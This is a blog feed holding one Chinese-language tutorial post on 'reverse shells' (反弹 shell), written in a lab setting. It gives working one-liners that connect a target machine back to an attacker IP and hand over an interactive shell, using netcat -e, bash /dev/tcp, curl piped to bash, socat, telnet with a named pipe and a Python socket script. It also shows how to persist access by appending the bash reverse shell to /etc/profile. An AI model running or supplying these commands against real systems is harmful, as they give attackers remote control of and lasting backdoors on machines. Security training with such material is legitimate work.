<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.sycamore.top</id>
    <title>Sycamore&#39;s Blog • Posts by &#34;reverse shell&#34; tag</title>
    <link href="https://www.sycamore.top" />
    <updated>2022-04-23T13:48:27.000Z</updated>
    <category term="Python" />
    <category term="计算机视觉" />
    <category term="深度学习" />
    <category term="Crypto" />
    <category term="Hexo" />
    <category term="shokaX" />
    <category term="博客主题" />
    <category term="实习" />
    <category term="springboot" />
    <category term="CTF" />
    <category term="Misc" />
    <category term="Web" />
    <category term="Miec" />
    <category term="Re" />
    <category term="Pwn" />
    <category term="Backdoor" />
    <category term="Linux" />
    <category term="Kali" />
    <category term="Trojan horse" />
    <category term="Metasploit" />
    <category term="frp" />
    <category term="shellter" />
    <category term="Reverse Shell" />
    <category term="Develop" />
    <category term="Electron" />
    <category term="Google Translate" />
    <category term="node" />
    <category term="Hitokoto" />
    <category term="npm" />
    <category term="plugs" />
    <category term="RCE，loophole" />
    <category term="毕业设计" />
    <category term="机器学习" />
    <category term="Diary" />
    <category term="Australia" />
    <category term="Mod" />
    <category term="CP2077" />
    <category term="archive" />
    <entry>
        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/</id>
        <title>反弹_shell</title>
        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/"/>
        <content type="html">&lt;h1 id=&#34;什么是反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是反弹shell&#34;&gt;#&lt;/a&gt; 什么是反弹 shell？&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;正向连接&lt;/strong&gt;，就是攻击者用自己的&lt;strong&gt;攻击机&lt;/strong&gt;连接到&lt;strong&gt;目标主机&lt;/strong&gt;的某一端口，&lt;strong&gt;常见&lt;/strong&gt;的有 web 服务、ssh、远程桌面等等。&lt;/p&gt;
&lt;p&gt;在&lt;strong&gt;实际情况&lt;/strong&gt;下，总会有很多时候，我们&lt;strong&gt;不能&lt;/strong&gt;通过正向连接访问到目标主机，这个时候就可以利用&lt;strong&gt;反向连接&lt;/strong&gt;来实现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反向连接&lt;/strong&gt;，通俗来说就是，攻击者&lt;strong&gt;监听&lt;/strong&gt;某个攻击机的指定端口，目标主机&lt;strong&gt;主动发起请求&lt;/strong&gt;到该端口，并将&lt;strong&gt;命令行的输入输出&lt;/strong&gt;转到攻击机上显示。&lt;/p&gt;
&lt;h1 id=&#34;适用情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#适用情况&#34;&gt;#&lt;/a&gt; 适用情况&lt;/h1&gt;
&lt;p&gt;反弹 shell 适用于如下几种常见的情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目标机因&lt;strong&gt;防火墙&lt;/strong&gt;受限，目标机器只能发送请求，不能接收请求。
&lt;ul&gt;
&lt;li&gt;所以让目标机&lt;strong&gt;主动发送请求&lt;/strong&gt;到攻击机指定端口来 &lt;strong&gt;getshell&lt;/strong&gt;&lt;br /&gt;
&amp;lt;br&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目标机端口&lt;strong&gt;被占用&lt;/strong&gt;。
&lt;ul&gt;
&lt;li&gt;但是&lt;strong&gt;攻击机&lt;/strong&gt;不会存在什么&lt;strong&gt;端口限制&lt;/strong&gt;&lt;br /&gt;
 &amp;lt;br&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攻击者&lt;strong&gt;无法预知&lt;/strong&gt;目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。
&lt;ul&gt;
&lt;li&gt;所以采用 &lt;strong&gt;监听 + 诱骗目标机主动执行某程序&lt;/strong&gt; 的方式获得 &lt;strong&gt;shell&lt;/strong&gt;&lt;br /&gt;
&amp;lt;br&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;虽然目标机中了招，但是目标机位于&lt;strong&gt;局域网&lt;/strong&gt;，或 IP 会&lt;strong&gt;动态变化&lt;/strong&gt;。
&lt;ul&gt;
&lt;li&gt;不能获得&lt;strong&gt;可用的 IP&lt;/strong&gt; 地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;实现方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现方式&#34;&gt;#&lt;/a&gt; 实现方式&lt;/h1&gt;
&lt;p&gt;反弹 shell 的方式有很多，那具体要用哪种方式还需要根据 目标主机的&lt;strong&gt;环境&lt;/strong&gt; 来确定，&lt;br /&gt;
比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果有 &lt;strong&gt;netcat&lt;/strong&gt; 或者 &lt;strong&gt;Socat&lt;/strong&gt; 或者 &lt;strong&gt;Telnet&lt;/strong&gt; 工具，那么可以利用 &lt;strong&gt;任意这三者之一&lt;/strong&gt; 反弹 shell，&lt;/li&gt;
&lt;li&gt;如果 &lt;strong&gt;bash&lt;/strong&gt; 可用，那么可以利用 bash 反弹 shell，&lt;/li&gt;
&lt;li&gt;如果具有 &lt;strong&gt;python&lt;/strong&gt; 或者 &lt;strong&gt;php&lt;/strong&gt; 的环境，那么可以利用 &lt;strong&gt;这些语言的脚本&lt;/strong&gt; 反弹 shell。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用-netcat-反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-netcat-反弹shell&#34;&gt;#&lt;/a&gt; 利用 netcat 反弹 shell&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Netcat&lt;/strong&gt;（即 &lt;strong&gt;nc&lt;/strong&gt; ） 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它可以轻易的建立任何连接。&lt;/p&gt;
&lt;h3 id=&#34;准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备&#34;&gt;#&lt;/a&gt; 准备：&lt;/h3&gt;
&lt;p&gt;目前，默认的各个 &lt;strong&gt;linux&lt;/strong&gt; 发行版本已经自带了 &lt;strong&gt;netcat&lt;/strong&gt; 工具包。&lt;/p&gt;
&lt;p&gt;但是有部分版本的 &lt;strong&gt;netcat&lt;/strong&gt; 的 &lt;strong&gt;-e&lt;/strong&gt; 功能 被阉割了&lt;br /&gt;
（大概是出于安全考虑，因为 &lt;strong&gt;-e&lt;/strong&gt; 可以直接发布与反弹本地 &lt;strong&gt;shell&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;对于这种情况，需要&lt;strong&gt;手动下载安装包&lt;/strong&gt;，命令如下：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvzf netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make clean&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;攻击机开启监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机开启监听&#34;&gt;#&lt;/a&gt; 攻击机开启监听：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;格式： &lt;code&gt;nc -lvvp &amp;lt;攻击机监听的端口&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;netcat -lvvp 23333&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png&#34; alt=&#34;image-20230426012933906&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;目标机主动连接攻击机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机主动连接攻击机&#34;&gt;#&lt;/a&gt; 目标机主动连接攻击机：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;格式： &lt;code&gt;nc &amp;lt;攻击机IP&amp;gt; &amp;lt;攻击机监听的端口&amp;gt; -e /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;netcat 192.168.158.139 23333 -e /bin/bash&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png&#34; alt=&#34;image-20230426012929850&#34; /&gt;&lt;/p&gt;
&lt;p&gt;（&lt;strong&gt;必须&lt;/strong&gt;攻击机&lt;strong&gt;先&lt;/strong&gt;开始 &lt;strong&gt;监听&lt;/strong&gt;，目标机&lt;strong&gt;再反弹 shell&lt;/strong&gt;，这样才会有效果）&lt;/p&gt;
&lt;p&gt;成功反弹 shell：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png&#34; alt=&#34;image-20230426012926374&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用-bash-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-bash-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Bash 反弹 shell&lt;/h2&gt;
&lt;p&gt;使用 Bash 中 &lt;strong&gt;网络重定向&lt;/strong&gt; 的方法&lt;/p&gt;
&lt;h3 id=&#34;准备-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备-2&#34;&gt;#&lt;/a&gt; 准备：&lt;/h3&gt;
&lt;p&gt;Kali Linux 中使用的 &lt;strong&gt;Shell&lt;/strong&gt; 是 &lt;strong&gt;zsh&lt;/strong&gt;，&lt;br /&gt;
可以用命令： &lt;code&gt;echo %SHELL&lt;/code&gt;  查看当前系统使用的 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png&#34; alt=&#34;image-20230426012919215&#34; /&gt;&lt;/p&gt;
&lt;p&gt;所以我们需要更换 Shell：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更换： &lt;code&gt;chsh -s /bin/bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;重启： &lt;code&gt;reboot&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png&#34; alt=&#34;image-20230426012915317&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;[注意]：&lt;/strong&gt; 出现下图错误只是因为 &lt;strong&gt;攻击机 没开监听&lt;/strong&gt;：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png&#34; alt=&#34;image-20230426012907770&#34; /&gt;&lt;/p&gt;
&lt;p&gt;另外，Debian 中，部分版本可能默认&lt;strong&gt;没开&lt;/strong&gt; bash 的 网络重定向 选项，&lt;/p&gt;
&lt;p&gt;对于这种情况，我们只能：加上 &lt;code&gt;--enable-net-redirections&lt;/code&gt;  &lt;strong&gt;重新编译 bash&lt;/strong&gt;&lt;br /&gt;
 详见我的另一篇文章：&lt;a href=&#34;&#34;&gt;【从源码重新编译 Bash：重定向功能】&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令&#34;&gt;#&lt;/a&gt; 命令：&lt;/h3&gt;
&lt;p&gt;（攻击机&lt;strong&gt;事先&lt;/strong&gt;开启 本地监听）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;格式： &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机IP/攻击机端口 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;成功反弹 shell：&lt;/strong&gt;&lt;br /&gt;
&lt;strong&gt;目标机&lt;/strong&gt; 界面 (反弹)：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png&#34; alt=&#34;image-20230426012903048&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击机&lt;/strong&gt; 界面 (监听)：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png&#34; alt=&#34;image-20230426012858851&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;详细解释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#详细解释&#34;&gt;#&lt;/a&gt; 详细解释：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;bash -i&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;产生一个 &lt;strong&gt;bash&lt;/strong&gt; 交互环境。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;把联合符号 前面 的内容与 后面 相结合，然后一起&lt;strong&gt;重定向&lt;/strong&gt;给后者。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/dev/tcp/192.168.158.139/23333&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/dev/tcp/ip/port&lt;/code&gt;  是 &lt;strong&gt;bash&lt;/strong&gt; 中定义的一个方法，&lt;/li&gt;
&lt;li&gt;作用是：让攻击机 (192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 &lt;strong&gt;tcp&lt;/strong&gt; 连接。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;0、1 为&lt;strong&gt;文件描述符&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;即将 &lt;strong&gt;标准输入 (0)&lt;/strong&gt; 与 &lt;strong&gt;标准输出 (1)&lt;/strong&gt; 的内容相结合，然后&lt;strong&gt;重定向&lt;/strong&gt;给前面 &lt;strong&gt;标准输出 (1)&lt;/strong&gt; 的内容。（在反弹 shell 中实现 &lt;strong&gt;输入输出&lt;/strong&gt; 的关键）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;curl-配合-bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#curl-配合-bash&#34;&gt;#&lt;/a&gt; Curl 配合 Bash&lt;/h3&gt;
&lt;p&gt;丰富一下用 Bash 反弹 Shell 的手段&lt;br /&gt;
（Curl 的命令借助了 Linux 中的管道）&lt;/p&gt;
&lt;h4 id=&#34;1-准备-indexphp-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-准备-indexphp-文件&#34;&gt;#&lt;/a&gt; 1. 准备 index.php 文件：&lt;/h4&gt;
&lt;p&gt;攻击机中创建  &lt;code&gt;index.php&lt;/code&gt;  文件，&lt;br /&gt;
填写的&lt;strong&gt;内容&lt;/strong&gt;为：直接使用  &lt;code&gt;Bash&lt;/code&gt;  反弹 &lt;strong&gt;Shell&lt;/strong&gt; 的情况下，目标机中运行的命令，即：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;存放&lt;/strong&gt;在 &lt;strong&gt;web&lt;/strong&gt; 目录下，&lt;br /&gt;
演示的 &lt;strong&gt;Kali Linux&lt;/strong&gt; 虚拟机开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务之后，对应目录为： &lt;code&gt;/var/www/html/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务之后，会在上述目录下生成一个  &lt;code&gt;index.php&lt;/code&gt;  文件，&lt;br /&gt;
可以直接删去内容并 &lt;strong&gt;修改&lt;/strong&gt;，该文件只是生成一个 &lt;strong&gt;web&lt;/strong&gt; 页面而已（如下图）&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png&#34; alt=&#34;image-20230426012853268&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-攻击机打开-23333-端口的监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-攻击机打开-23333-端口的监听&#34;&gt;#&lt;/a&gt; 2. 攻击机打开 23333 端口的监听&lt;/h4&gt;
&lt;p&gt;命令： &lt;code&gt;netcat -lvvp 23333&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;3-目标机输入-curl-命令反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-目标机输入-curl-命令反弹-shell&#34;&gt;#&lt;/a&gt; 3. 目标机输入 Curl 命令反弹 shell&lt;/h4&gt;
&lt;p&gt;命令： &lt;code&gt;curl 192.168.158.139|bash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;实现如图：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png&#34; alt=&#34;image-20230426012839981&#34; /&gt;&lt;/p&gt;
&lt;p&gt;成功反弹 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;bash-反弹命令写入-etcprofile-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash-反弹命令写入-etcprofile-文件&#34;&gt;#&lt;/a&gt; Bash 反弹命令写入 /etc/profile 文件&lt;/h3&gt;
&lt;p&gt;文件  &lt;code&gt;/etc/profile&lt;/code&gt;  中的内容，会在 &lt;strong&gt;Bash&lt;/strong&gt; 窗口打开时执行。&lt;/p&gt;
&lt;h4 id=&#34;如图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#如图&#34;&gt;#&lt;/a&gt; 如图：&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;（下图中我输入的是&lt;strong&gt;错误的代码&lt;/strong&gt;，所以&lt;strong&gt;启动 Bash&lt;/strong&gt; 之后，会&lt;strong&gt;输出报错&lt;/strong&gt;内容到命令行）&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png&#34; alt=&#34;image-20230426012821415&#34; /&gt;&lt;br /&gt;
（如果是&lt;strong&gt;正确的代码&lt;/strong&gt;，但是攻击侧&lt;strong&gt;没开监听&lt;/strong&gt;，也会报错，如下图：）&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png&#34; alt=&#34;image-20230426012825282&#34; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;布置的步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#布置的步骤&#34;&gt;#&lt;/a&gt; 布置的步骤：&lt;/h4&gt;
&lt;p&gt;通过  &lt;code&gt;vim /etc/profile&lt;/code&gt; ，编辑文件：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png&#34; alt=&#34;image-20230426012816962&#34; /&gt;&lt;br /&gt;
&amp;lt;br&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在末尾添加代码： &lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;该命令比直接反弹的代码在 &lt;strong&gt;末尾&lt;/strong&gt; 多了一个 &lt;strong&gt;&amp;amp;&lt;/strong&gt;，&lt;br /&gt;
这是为了让打开 &lt;strong&gt;Bash&lt;/strong&gt; 的用户能正常使用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png&#34; alt=&#34;image-20230426012812596&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;演示：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击机开始监听 23333 端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Xshell&lt;/strong&gt; 打开目标机的会话（即&lt;strong&gt;启动了 Bash&lt;/strong&gt;）&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png&#34; alt=&#34;image-20230426012807425&#34; /&gt;&lt;/li&gt;
&lt;li&gt;没有回显，且攻击机&lt;strong&gt;成功 getshell&lt;/strong&gt;，&lt;strong&gt;反弹成功&lt;/strong&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png&#34; alt=&#34;image-20230426012804072&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用-socat-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-socat-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Socat 反弹 Shell&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Socat&lt;/strong&gt; 是 &lt;strong&gt;Linux&lt;/strong&gt; 下一个多功能的网络工具，功能与 &lt;strong&gt;netcat (nc)&lt;/strong&gt; 类似。&lt;br /&gt;
所以我们也可以使用 &lt;strong&gt;Socat&lt;/strong&gt;，开监听、反弹 &lt;strong&gt;Shell&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;下载-socat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载-socat&#34;&gt;#&lt;/a&gt; 下载 Socat&lt;/h3&gt;
&lt;p&gt;试验之前，要先下载 &lt;strong&gt;Socat&lt;/strong&gt;（&lt;strong&gt;Kali Linux&lt;/strong&gt; 已经&lt;strong&gt;预装&lt;/strong&gt;了该工具），&lt;br /&gt;
如果没有安装，使用命令： &lt;code&gt;apt-get install socat&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;攻击机开启监听-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机开启监听-2&#34;&gt;#&lt;/a&gt; 攻击机开启监听&lt;/h3&gt;
&lt;p&gt;命令： &lt;code&gt;socat TCP-LISTEN:23333 -&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png&#34; alt=&#34;image-20230426012759404&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;目标机通过-socat-建立连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机通过-socat-建立连接&#34;&gt;#&lt;/a&gt; 目标机通过 Socat 建立连接&lt;/h3&gt;
&lt;p&gt;命令： &lt;code&gt;socat tcp-connect:192.168.158.139:23333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png&#34; alt=&#34;image-20230426012754642&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;成功&lt;/strong&gt; 反弹 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png&#34; alt=&#34;image-20230426012750258&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用-telnet-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-telnet-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Telnet 反弹 Shell&lt;/h2&gt;
&lt;p&gt;我们总会遇到，目标机 &lt;strong&gt;Netcat&lt;/strong&gt; 和  &lt;code&gt;/dev/tcp/&lt;/code&gt;  方法不可用的情况，&lt;br /&gt;
这时候如果 目标机配有 &lt;strong&gt;Telnet&lt;/strong&gt; 服务，我们可以用 &lt;strong&gt;Telnet&lt;/strong&gt; 建立反向连接。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击机开启监听&lt;br /&gt;
（用 &lt;strong&gt;nc&lt;/strong&gt; 或者 &lt;strong&gt;socat&lt;/strong&gt; 都行）&lt;/li&gt;
&lt;li&gt;目标机执行命令，建立连接：&lt;br /&gt;
 &lt;code&gt;mknod a p; telnet 47.xxx.xxx.72 2333 0&amp;lt;a | /bin/bash 1&amp;gt;a&lt;/code&gt; &lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png&#34; alt=&#34;image-20230426012739427&#34; /&gt;&lt;/li&gt;
&lt;li&gt;成功获得 &lt;strong&gt;反弹 Shell&lt;/strong&gt;：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png&#34; alt=&#34;image-20230426012732507&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用-python-脚本反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用-python-脚本反弹-shell&#34;&gt;#&lt;/a&gt; 用 Python 脚本反弹 Shell&lt;/h2&gt;
&lt;p&gt;使用 &lt;strong&gt;Python&lt;/strong&gt; 的 &lt;strong&gt;socket&lt;/strong&gt; 库&lt;/p&gt;
&lt;p&gt;攻击机开启监听后，直接使用命令：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.158.139&amp;quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
（或者也可以转化成 .py 的 Python 文件，然后命令行执行）&lt;/p&gt;
&lt;p&gt;如下图所示：&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png&#34; alt=&#34;image-20230426012727025&#34; /&gt;&lt;br /&gt;
 成功反弹 &lt;strong&gt;Shell&lt;/strong&gt;&lt;br /&gt;
